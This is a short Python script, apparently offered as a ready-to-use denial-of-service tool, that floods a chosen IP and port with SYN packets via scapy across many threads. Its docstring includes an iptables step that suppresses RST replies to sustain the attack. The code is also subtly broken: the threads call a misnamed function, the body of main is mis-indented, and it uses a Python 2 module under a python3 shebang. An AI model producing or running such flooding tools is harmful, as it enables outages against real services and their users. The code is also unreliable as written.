#!/usr/bin/env python3
#coding:utf-8


'''
step1 iptables -A OUTPUT -p tcp --tcp-flags RST RST -d [localhost] -j DROP

step2 python SYN_flood.py [ip] [port] [threadcount]
'''
from scapy.all import *
from time import sleep

import thread
import random

def syn_flood(target,port):
    while 1:
        rand = random.randint(0,65535)
        send(IP(dst=target)/TCP(dport=port,sport=rand),verbose=0)

def main():
    if len(sys.argv) != 4:
        print("error")
        sys.exit()

target = sys.argv[1]
port = int(sys.argv[2])
thread_count = int(sys.argv[3])
print("attack start, ctrl + c stop")
for i in range(thread_count):
    thread.start_new_thread(sys_flood,(target,port))
while 1:
    sleep(1)

if __name__ == "__main__":
    main()